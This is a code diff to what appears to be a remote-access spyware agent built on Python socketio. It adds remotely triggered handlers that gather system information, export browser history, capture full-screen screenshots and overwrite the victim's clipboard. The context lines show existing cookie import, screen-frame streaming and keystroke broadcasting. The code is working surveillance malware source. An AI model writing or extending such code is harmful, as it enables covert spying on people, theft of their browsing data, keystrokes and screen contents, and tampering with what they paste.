@@ -203,6 +203,59 @@ def on_import_cookies(data):
         socketio.emit("import_result", {"ok": False, "message": str(e)})
 
 
+# ── System info ──────────────────────────────────────────────────────────────
+@socketio.on("get_sysinfo")
+def on_get_sysinfo(_data=None):
+    try:
+        import sysinfo
+        info = sysinfo.get_info()
+        socketio.emit("sysinfo_result", info)
+    except Exception as e:
+        socketio.emit("sysinfo_result", {"error": str(e)})
+
+
+# ── Browser history ──────────────────────────────────────────────────────────
+@socketio.on("get_history")
+def on_get_history(data=None):
+    try:
+        import browser_history as bh
+        limit = (data or {}).get("limit", 500)
+        history = bh.export_all(limit=limit)
+        socketio.emit("history_result", {"history": history, "count": len(history)})
+    except Exception as e:
+        socketio.emit("history_result", {"error": str(e), "history": [], "count": 0})
+
+
+# ── On-demand screenshot ────────────────────────────────────────────────────
+@socketio.on("take_screenshot")
+def on_take_screenshot(_data=None):
+    try:
+        import mss as _mss, base64 as _b64
+        from PIL import Image as _Img
+        import io as _io
+        with _mss.mss() as sct:
+            shot = sct.grab(sct.monitors[1])
+            img = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+            buf = _io.BytesIO()
+            img.save(buf, format="PNG")
+            b64 = _b64.b64encode(buf.getvalue()).decode()
+            socketio.emit("screenshot_result", {"data": b64, "_agent": _AGENT_NAME})
+    except Exception as e:
+        socketio.emit("screenshot_result", {"error": str(e)})
+
+
+# ── Clipboard inject ────────────────────────────────────────────────────────
+@socketio.on("clipboard_set")
+def on_clipboard_set(data):
+    try:
+        import pyperclip
+        text = data.get("text", "")
+        pyperclip.copy(text)
+        socketio.emit("clipboard_set_result", {"ok": True})
+    except Exception as e:
+        socketio.emit("clipboard_set_result", {"ok": False, "error": str(e)})
+
+
 # ── Broadcast helpers ─────────────────────────────────────────────────────────
 def broadcast_frame(b64):      socketio.emit("frame",        {"data": b64,  "_agent": _AGENT_NAME})
 def broadcast_key(data):       socketio.emit("key",          {**data,       "_agent": _AGENT_NAME})
